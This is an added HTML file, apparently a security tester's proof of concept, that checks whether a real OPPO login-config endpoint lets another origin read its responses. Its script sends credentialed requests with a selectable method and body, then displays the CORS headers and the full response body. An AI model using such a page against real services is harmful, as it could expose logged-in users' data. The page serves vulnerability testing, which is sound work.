@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CORS Security Validation</title>
+  </head>
+  <body>
+    <h2>CORS PoC — OPPO Login Config</h2>
+    <p>Pengujian keterbacaan response lintas origin.</p>
+
+    <label for="endpointInput">Endpoint:</label><br />
+    <input
+      id="endpointInput"
+      type="text"
+      value="https://id-sg.oppo.com/identity/web/v1/config/login"
+      style="width: 100%; margin-bottom: 8px"
+    /><br />
+
+    <label for="methodInput">Method:</label>
+    <select id="methodInput">
+      <option value="POST" selected>POST</option>
+      <option value="GET">GET</option>
+      <option value="PUT">PUT</option>
+      <option value="DELETE">DELETE</option>
+    </select>
+    <br /><br />
+
+    <label for="bodyInput">Request Body (JSON):</label><br />
+    <textarea id="bodyInput" rows="4" style="width: 100%">{}</textarea>
+    <br /><br />
+
+    <button id="run">Jalankan pemeriksaan</button>
+    <pre id="result">Belum dijalankan.</pre>
+
+    <script>
+      document.getElementById("run").onclick = async () => {
+        const output = document.getElementById("result");
+        const endpoint = document.getElementById("endpointInput").value.trim();
+        const method = document.getElementById("methodInput").value;
+        const bodyRaw = document.getElementById("bodyInput").value.trim();
+
+        output.textContent = `Mengirim request ${method} ke ${endpoint}...`;
+
+        const fetchOptions = {
+          method,
+          credentials: "include",
+          headers: { "Content-Type": "application/json" },
+        };
+
+        if (method !== "GET" && method !== "DELETE") {
+          fetchOptions.body = bodyRaw;
+        }
+
+        try {
+          const response = await fetch(endpoint, fetchOptions);
+          const body = await response.text();
+
+          const targetHeaders = [
+            "access-control-allow-origin",
+            "access-control-allow-credentials",
+            "access-control-allow-methods",
+            "access-control-allow-headers",
+            "content-type",
+            "x-backend-host",
+            "x-gateway-host",
+            "server",
+            "date",
+          ];
+
+          const headers = {};
+          targetHeaders.forEach((key) => {
+            const val = response.headers.get(key);
+            if (val) headers[key] = val;
+          });
+
+          output.textContent = JSON.stringify(
+            {
+              endpoint,
+              method,
+              browserCanReadResponse: true,
+              status: response.status,
+              responseHeaders: headers,
+              responseLength: body.length,
+              responseBody: body,
+            },
+            null,
+            2,
+          );
+        } catch (error) {
+          output.textContent = JSON.stringify(
+            {
+              endpoint,
+              method,
+              browserCanReadResponse: false,
+              error: String(error),
+              hint: "Periksa DevTools Console dan Network.",
+            },
+            null,
+            2,
+          );
+        }
+      };
+    </script>
+  </body>
+</html>
